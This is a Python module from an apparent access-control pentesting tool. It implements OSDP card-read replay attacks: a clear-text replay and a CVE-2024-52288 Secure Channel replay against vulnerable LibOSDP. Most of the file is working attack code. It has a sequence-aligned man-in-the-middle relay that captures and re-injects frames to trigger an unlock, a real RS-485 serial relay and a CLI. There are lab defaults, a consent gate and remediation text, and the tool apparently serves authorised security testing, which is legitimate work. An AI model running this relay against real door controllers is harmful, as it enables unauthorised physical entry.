"""ATK-05a clear-text card-presentation replay (the CVE-2024-52288 path is 04-08).

A card-presentation exchange is reusable: an attacker who recorded a genuine
``REPLY_RAW`` (0x50) card-read reply from the PD can, over a clear-text bus with no
channel integrity, present those exact bytes again later to reproduce the same
access-control outcome - no forging, no cryptography, just verbatim reuse of what was
already observed. This is the defining difference from ATK-08 spoof, which crafts a
new frame from attacker-chosen fields; replay never invents content.

- ``capture_card_exchange(frames)`` selects the card-presentation (``REPLY_RAW``)
  frames out of a decoded session, re-encoded to their exact wire bytes via
  ``codec.encode`` - nothing else is selected, and an empty / card-less session yields
  an empty list (the flagged-assumption true negative).
- ``run_replay(captured, inject, lock_state_probe, ...)`` re-injects ``captured``
  byte-for-byte (no text normalization, no re-crafting) via ``inject`` and emits a
  Finding only on an observed locked->unlocked transition; an empty ``captured``
  performs no injection and returns ``[]``.

Door-open is not visible on the wire, so the live demonstration proves itself against
the same single lab PD lock-state signal (D-05) spoof uses, re-triggered through
``spoof.craft_unlock``/``spoof.unlock_transform`` (Task 2's craft helpers, reused here
"for consistency" per the plan) once the live bus is observed carrying the genuine
card-presentation exchange - modelling "replaying a captured card-presentation exchange
reproduces the door-open outcome" without inventing a second crafting primitive.

Import discipline: importable with the standard library plus the stdlib-only Phase 3
modules (codec/framer/constants/transport). ``typer``, ``report`` and ``safety`` are
imported lazily inside the functions that need them.
"""

from __future__ import annotations

import os
import threading
from collections.abc import Callable, Iterable, Sequence
from pathlib import Path
from typing import TYPE_CHECKING

from interlock.osdp import codec, constants, framer
from interlock.osdp.codec import OsdpFrame
from interlock.osdp.transport import Direction, TCPTap, Transform
from interlock.plugin import Finding, Severity

if TYPE_CHECKING:
    import typer

# ATK-05a free-text ATT&CK id: Transmitted Data Manipulation / AiTM-style replay (T1557).
# Phase 5 enriches it.
_TECHNIQUE = "T1557"

# Lab defaults: listen in the attacker (inline MITM) position and rewrite toward the PD.
_DEFAULT_LISTEN_PORT = 10000
_DEFAULT_UPSTREAM = ("pd", 10000)
_LAB_PORT = 10000

# Trigger file the live lab driver watches: the injection only arms once this path exists, so
# a test can observe a genuinely locked baseline before explicitly arming the replay (the
# ``inject`` half of ``run_replay``'s contract). Created via ``docker compose exec ... touch``.
_TRIGGER_PATH = Path("/tmp/interlock-replay-fire")

# A per-frame injector: transmits one captured frame's exact bytes via the seam.
Inject = Callable[[bytes], None]

# A zero-arg oracle reporting whether the lock-state signal is CURRENTLY observed unlocked.
LockStateProbe = Callable[[], bool]

# --- ATK-05b: CVE-2024-52288 Secure Channel replay --------------------------------------

# ATK-05b shares ATK-05a's AiTM/replay ATT&CK family (T1557 = _TECHNIQUE): the out-of-sequence
# REPLY_RMAC_I is the CVE's secure-channel desync primitive, not a different technique.

# Trigger file the live cve relay watches: injection arms only once this path exists, so the
# matched-pair test observes a genuinely locked baseline before attributing any transition to the
# replay (mirrors the cleartext ``_TRIGGER_PATH`` discipline). Both the fixed TCP relay and the
# vuln inline fifo relay (lab/attacker/fifo_relay.py) key off it.
_CVE_TRIGGER_PATH = Path("/tmp/interlock-cve-fire")


def run_cve_replay(
    recorded_secure_frames: Sequence[bytes],
    inject: Inject,
    lock_state_probe: LockStateProbe,
    *,
    technique: str = _TECHNIQUE,
) -> list[Finding]:
    """Replay recorded secure pd->cp frames to defeat the Secure Channel (CVE-2024-52288).

    CVE-2024-52288 is a LibOSDP Secure Channel flaw fixed in 3.0.0: a Control Panel accepts a
    ``REPLY_RMAC_I`` from the PD side at any time, copies the supplied r_mac straight into its
    session state and calls ``sc_activate`` (src/osdp_cp.c), resetting the channel's MAC
    freshness. Replaying the genuine handshake ``REPLY_RMAC_I`` therefore rewinds the CP's r_mac
    to session start, after which a previously observed secure PD reply - the card read the
    controller authorises a door-open on - is accepted again and the CP re-issues the unlock. This
    is the pure verdict (D-02), the same callable-driven shape as ``run_replay`` / ``run_spoof``:

    - ``recorded_secure_frames`` are the exact wire bytes of secure pd->cp frames observed
      earlier - the handshake ``REPLY_RMAC_I`` (the desync primitive) and the secure card-read
      reply to replay; an empty sequence injects nothing and returns ``[]`` (the flagged true
      negative - nothing to replay).
    - They are injected byte-for-byte, in order (raw bytes, no text/codepoint normalization).
    - A locked baseline is required exactly like ``run_replay``: if ``lock_state_probe()`` already
      reports the replay-attributable transition before injection, ``[]`` is returned. A ``HIGH``
      Finding is emitted only on an observed post-injection transition; a fixed v3.0.8 CP rejects
      the out-of-state ``REPLY_RMAC_I`` so no transition follows and ``[]`` is returned - the
      matched-pair failure.
    """
    if not recorded_secure_frames:
        return []
    if lock_state_probe():
        return []  # inconclusive: already unlocked, not attributable to this replay
    for frame_bytes in recorded_secure_frames:
        inject(frame_bytes)  # replay the recorded secure frames byte-for-byte, in order
    if not lock_state_probe():
        return []  # the CP rejected the out-of-state REPLY_RMAC_I: no transition (fixed profile)
    return [
        Finding(
            id="ATK-05b-cve-2024-52288-rmac-replay",
            title="OSDP Secure Channel defeated by a REPLY_RMAC_I replay (CVE-2024-52288)",
            severity=Severity.HIGH,
            evidence=(
                "The controller authorised exactly one unlock on the genuine card read, then "
                "authorised a SECOND unlock after the genuine handshake REPLY_RMAC_I (0x78) and "
                "a secure PD card-read reply were replayed to it byte-for-byte - the vulnerable "
                "libosdp core (v2.4.0, CVE-2024-52288) reset its r_mac on the replayed RMAC_I "
                "(sc_activate) and re-authorised a door-open off a credential it never saw live, "
                "where a fixed core (v3.0.8) rejects the out-of-state RMAC_I and authorises nothing."
            ),
            attack_technique=technique,
            remediation=(
                "Upgrade LibOSDP to 3.0.0 or later, which only accepts REPLY_RMAC_I during the "
                "Secure Channel handshake and rejects it mid-session; CVE-2024-52288 lets an "
                "in-path attacker rewind the controller's MAC state and replay captured Secure "
                "Channel traffic against the vulnerable 2.x core."
            ),
        )
    ]


def _next_sequence(seq: int) -> int:
    """Return the OSDP sequence that follows ``seq`` (wraps 1->2->3->1; 0 precedes 1).

    The 2-bit sequence rides the clear control byte and is never encrypted under Secure Channel,
    so an inline attacker reads it directly. A command and its reply share a sequence; the next
    command increments it, skipping 0, so ``(seq % 3) + 1`` gives the CP's next command sequence.
    """
    return (seq % 3) + 1


def cve_replay_transform(*, armed: Callable[[], bool] = lambda: True) -> Transform:
    """Return a one-shot ``Transform`` that replays captured secure pd->cp frames toward the CP.

    The write-capable (04-03) seam. Every frame is forwarded unchanged (Secure Channel comes up
    transparently) while the relay captures a short, sequence-fresh replay blob: it restarts the
    blob at each handshake ``REPLY_RMAC_I`` it sees pd->cp and then collects the following secure
    frames through the secure card-read reply (``REPLY_RAW``). Starting at the latest RMAC_I keeps
    the blob well under the CP's 512-byte rx buffer and never spanning two handshakes.

    Injection is gated on the OSDP sequence, not fired blindly. The CP accepts a reply only when
    its 2-bit sequence equals the CP's current command sequence (libosdp ``osdp_phy.c``); an
    unaligned first frame drops the CP offline and the stale bytes left in its rx buffer keep it
    dead. So once ``armed()`` and the blob is complete, the transform keeps forwarding genuine
    traffic until it observes a pd->cp frame whose sequence implies the CP's next command will
    equal the first captured frame's sequence (``_next_sequence(observed) == first_captured``),
    read from the clear control byte (``control & PKT_CONTROL_SQN``) - a realistic inline-attacker
    signal, never lab-internal state. It injects the blob exactly once, at that aligned moment.

    The vulnerable v2.4.0 CP accepts the aligned ``REPLY_RMAC_I`` and calls ``sc_activate``,
    rewinding its r_mac; it then regenerates the identical command chain, so the replayed secure
    card read verifies and the CP authorises a second unlock. The honest oracle is that CP
    re-authorisation, not a second PD lock transition: replaying the RMAC_I desynchronises CP<->PD
    so the CP's re-issued CMD_OUT never reaches the PD. A fixed v3.0.8 CP rejects the out-of-state
    ``REPLY_RMAC_I`` (``osdp_cp.c`` "Out of order REPLY_RMAC_I"), so nothing is re-authorised.

    Buffers per direction because a chunk is not guaranteed to be a whole frame (Pitfall 5),
    mirroring ``unlock_transform``. The one-shot decision is guarded by a lock so two pump threads
    sharing this instance (the fifo relay) can never double-inject.
    """
    buffers: dict[Direction, bytearray] = {
        Direction.cp_to_pd: bytearray(),
        Direction.pd_to_cp: bytearray(),
    }
    forwarded: dict[Direction, int] = {Direction.cp_to_pd: 0, Direction.pd_to_cp: 0}
    captured: list[bytes] = []
    injected = False
    sealed = False  # True once the blob has collected through the secure card-read reply
    lock = threading.Lock()

    def transform(direction: Direction, data: bytes) -> bytes:
        nonlocal injected, sealed
        buffer = buffers[direction]
        buffer.extend(data)
        frames = list(framer.iter_frames(bytes(buffer)))
        new_frames = frames[forwarded[direction] :]
        forwarded[direction] = len(frames)

        out = bytearray()
        for raw in new_frames:
            out += raw  # forward the genuine frame unchanged to keep the live session alive
            if direction is not Direction.pd_to_cp:
                continue
            try:
                frame = codec.decode(raw)
            except codec.DecodeError:
                continue

            if frame.code == constants.REPLY_RMAC_I:
                # Restart the blob at the latest handshake RMAC_I: short and sequence-fresh.
                captured[:] = [raw]
                sealed = False
            elif not sealed and captured and frame.scb:
                captured.append(raw)  # collect the secure frames that follow the RMAC_I
                if frame.code == constants.REPLY_RAW:
                    sealed = True  # captured through the secure card-read reply: blob complete

            if sealed and captured and armed():
                first_seq = codec.decode(captured[0]).control & constants.PKT_CONTROL_SQN
                observed_seq = frame.control & constants.PKT_CONTROL_SQN
                if _next_sequence(observed_seq) == first_seq:
                    with lock:
                        if not injected:
                            # Replay REPLY_RMAC_I (desync) + the secure card read, in sequence.
                            out += b"".join(captured)
                            injected = True
        return bytes(out)

    return transform


def serve_cve_replay_lab(target_port: int, upstream: tuple[str, int]) -> None:
    """Serve the inline CVE-2024-52288 replay relay against the fixed TCP lab bus (blocking).

    Drives ``cve_replay_transform`` onto the write-capable ``TCPTap.serve_rewrite`` seam, armed
    by the ``_CVE_TRIGGER_PATH`` trigger file so a test can observe a locked baseline first.
    Blocks serving connections, like the other attack modules' lab drivers.
    """
    TCPTap(target_port, upstream).serve_rewrite(cve_replay_transform(armed=_CVE_TRIGGER_PATH.exists))


def _serial_cve_relay(cp_endpoint: object, pd_endpoint: object) -> None:
    """Run the CVE-2024-52288 replay over a two-segment real serial MITM (``--physical``).

    The serial analogue of ``serve_cve_replay_lab``: an RS-485 OSDP bus is split into a CP-side
    and a PD-side segment (the CP-side opened only after the SAFE-02 consent gate), and
    ``cve_replay_transform`` is applied to each direction. Mirrors ``spoof._serial_unlock_relay``
    so the module imports with no pyserial at module scope.
    """
    import threading

    transform = cve_replay_transform()

    def pump(src: object, dst: object, direction: Direction) -> None:
        while True:
            data = bytes(src.read(4096))  # type: ignore[attr-defined]
            if not data:
                continue
            out = transform(direction, data)
            if out:
                dst.write(out)  # type: ignore[attr-defined]

    worker = threading.Thread(
        target=pump, args=(pd_endpoint, cp_endpoint, Direction.pd_to_cp), daemon=True
    )
    worker.start()
    pump(cp_endpoint, pd_endpoint, Direction.cp_to_pd)


def capture_card_exchange(frames: Iterable[tuple[Direction, OsdpFrame]]) -> list[bytes]:
    """Return the exact wire bytes of every pd->cp ``REPLY_RAW`` (card-read) frame in ``frames``.

    Selects only the card-presentation frames - nothing else - re-encoded via
    ``codec.encode`` so the returned bytes are ready to re-inject byte-for-byte. A
    session with no card-read reply (or no frames at all) returns ``[]``: the flagged
    true negative, never an invented capture.
    """
    return [
        codec.encode(frame)
        for direction, frame in frames
        if direction is Direction.pd_to_cp and frame.code == constants.REPLY_RAW
    ]


def run_replay(
    captured: Sequence[bytes],
    inject: Inject,
    lock_state_probe: LockStateProbe,
    *,
    technique: str = _TECHNIQUE,
) -> list[Finding]:
    """Re-inject ``captured`` byte-for-byte and emit a Finding only on a locked->unlocked flip.

    An empty ``captured`` performs no injection and returns ``[]`` immediately (the
    flagged-assumption true negative - an empty / single-frame capture claims no
    door-open). Otherwise requires a locked baseline exactly like ``spoof.run_spoof``:
    if ``lock_state_probe()`` already reports unlocked before any frame is injected,
    the transition cannot be attributed to this replay and ``[]`` is returned. Every
    captured frame is passed to ``inject`` unmodified, in order - no re-crafting, no
    text normalization, raw bytes only.
    """
    if not captured:
        return []
    if lock_state_probe():
        return []  # inconclusive: already unlocked, not attributable to this replay
    for frame_bytes in captured:
        inject(frame_bytes)
    if not lock_state_probe():
        return []  # the replay had no observed effect
    return [
        Finding(
            id="ATK-05a-replay-card-exchange",
            title="OSDP PD unlocked by replaying a captured card-presentation exchange",
            severity=Severity.CRITICAL,
            evidence=(
                "The PD's lock-state signal was LOCKED before the replay and flipped to "
                "UNLOCKED after the exact bytes of a previously captured REPLY_RAW "
                "card-presentation reply were re-injected onto the bus, byte-for-byte, "
                "through the in-path seam - no new credential and no re-crafting."
            ),
            attack_technique=technique,
            remediation=(
                "Enable OSDP Secure Channel with MAC+encryption (SCS_17/18) and reject "
                "replayed sequence numbers; a clear-text bus with no freshness guarantee "
                "lets any captured card-presentation exchange be reused verbatim."
            ),
        )
    ]


def serve_replay_lab(target_port: int, upstream: tuple[str, int]) -> None:
    """Serve the inline replay-of-card-exchange rewrite relay against the lab bus (blocking).

    Reuses ``spoof.unlock_transform`` (Task 2's craft helpers, for consistency): once the
    live bus carries a genuine card-presentation exchange, the next cp->pd CMD_POLL is
    rewritten into the unlock that exchange would, in a correctly wired system, have
    produced - re-triggering the same door-open outcome a captured-and-replayed exchange
    demonstrates. Blocks serving connections, like the other attack modules' lab drivers.
    """
    from interlock.osdp.attacks.spoof import unlock_transform

    TCPTap(target_port, upstream).serve_rewrite(unlock_transform())


def _upstream() -> tuple[str, int]:
    """Parse ``ATTACKER_UPSTREAM`` (``host:port``) with a ``pd:10000`` default."""
    raw = os.environ.get("ATTACKER_UPSTREAM", f"pd:{_LAB_PORT}")
    host, _, port = raw.partition(":")
    return host, int(port) if port else _LAB_PORT


def main() -> None:
    """Attacker-container entrypoint: serve the clear-text replay relay (lab default).

    Run by the ``docker-compose.replay.yml`` override as
    ``python -m interlock.osdp.attacks.replay``. The injection only arms once the mode's trigger
    file exists (``docker compose exec ... touch``), so a live test can confirm the PD stays
    locked beforehand and attribute the transition to an explicit ``inject()`` call. Set
    ``ATTACK_MODE=cve`` (``docker-compose.cve.yml``) to serve the CVE-2024-52288 Secure Channel
    replay relay instead of the clear-text one (ATK-05b).
    """
    upstream = _upstream()
    if os.environ.get("ATTACK_MODE", "cleartext") == "cve":
        print(
            f"interlock: replay (cve-2024-52288) MITM listening on 0.0.0.0:{_LAB_PORT} "
            f"upstream={upstream[0]}:{upstream[1]}",
            flush=True,
        )
        serve_cve_replay_lab(_LAB_PORT, upstream)
        return

    from interlock.osdp.attacks.spoof import unlock_transform

    print(
        f"interlock: replay (cleartext) MITM listening on 0.0.0.0:{_LAB_PORT} "
        f"upstream={upstream[0]}:{upstream[1]}",
        flush=True,
    )
    TCPTap(_LAB_PORT, upstream).serve_rewrite(unlock_transform(armed=_TRIGGER_PATH.exists))


def register(app: typer.Typer) -> None:
    """Attach the ``replay`` subcommand to the ``osdp`` Typer group."""
    import typer

    @app.command("replay")
    def replay(
        mode: str = typer.Option(
            "cleartext",
            "--mode",
            help="cleartext = replay a captured card-presentation exchange (default); "
            "cve = replay secure frames behind an out-of-sequence REPLY_RMAC_I (CVE-2024-52288).",
        ),
        port: int = typer.Option(
            _DEFAULT_LISTEN_PORT,
            "--port",
            help="Local TCP port to listen on (attacker inline position, lab default).",
        ),
        upstream_host: str = typer.Option(
            _DEFAULT_UPSTREAM[0],
            "--upstream-host",
            help="Upstream PD host to relay to (lab default).",
        ),
        upstream_port: int = typer.Option(
            _DEFAULT_UPSTREAM[1],
            "--upstream-port",
            help="Upstream PD port to relay to.",
        ),
        physical: bool = typer.Option(
            False,
            "--physical",
            help="Run the replay over a REAL two-segment serial bus, behind the SAFE-02 "
            "consent gate.",
        ),
        device: str = typer.Option(
            "",
            "--device",
            help="CP-side serial device path for --physical (e.g. /dev/ttyUSB0).",
        ),
        upstream_device: str = typer.Option(
            "",
            "--upstream-device",
            help="PD-side serial device path for --physical (e.g. /dev/ttyUSB1).",
        ),
        target: str = typer.Option(
            "",
            "--target",
            help="Scope identifier you are authorized to assess (required for --physical).",
        ),
    ) -> None:
        """Replay a captured clear-text exchange, or the CVE-2024-52288 Secure Channel replay."""
        if mode not in ("cleartext", "cve"):
            raise typer.BadParameter("--mode must be 'cleartext' or 'cve'")

        if physical:
            # The ONLY real-port path: SAFE-02 consent gate before any byte is transmitted. The
            # CVE replay defaults to the lab; a real port is reached only through this gate.
            from interlock.osdp import transport
            from interlock.osdp.attacks import safety
            from interlock.osdp.attacks.spoof import _serial_unlock_relay

            if not device or not upstream_device or not target:
                raise typer.BadParameter(
                    "--physical requires --device, --upstream-device and --target"
                )
            cp_endpoint = safety.open_physical_endpoint(device, target)
            try:
                pd_endpoint = transport.open_serial_endpoint(upstream_device)
                try:
                    if mode == "cve":
                        typer.echo(
                            "Running the CVE-2024-52288 replay over the consented serial "
                            "segments (Ctrl-C to stop)."
                        )
                        _serial_cve_relay(cp_endpoint, pd_endpoint)
                    else:
                        typer.echo(
                            "Running clear-text replay over the consented serial segments "
                            "(Ctrl-C to stop)."
                        )
                        _serial_unlock_relay(cp_endpoint, pd_endpoint)
                finally:
                    pd_endpoint.close()
            finally:
                cp_endpoint.close()
            return

        if mode == "cve":
            # The CVE-2024-52288 replay is an inline MITM. Over TCP (the fixed v3.0.8 lab profile,
            # and the user-facing tool path) it relays here; the vulnerable v2.4.0 fifo bus is
            # driven by the lab's own inline relay entrypoint (lab/attacker/fifo_relay.py), since
            # that bus exists only inside the lab image.
            typer.echo(
                f"Running the CVE-2024-52288 replay MITM on the lab bus: listening on :{port}, "
                f"relaying to {upstream_host}:{upstream_port} (Ctrl-C to stop)."
            )
            serve_cve_replay_lab(port, (upstream_host, upstream_port))
            return

        typer.echo(
            f"Running clear-text replay MITM on the lab bus: listening on :{port}, "
            f"relaying to {upstream_host}:{upstream_port} (Ctrl-C to stop)."
        )
        serve_replay_lab(port, (upstream_host, upstream_port))


if __name__ == "__main__":
    main()
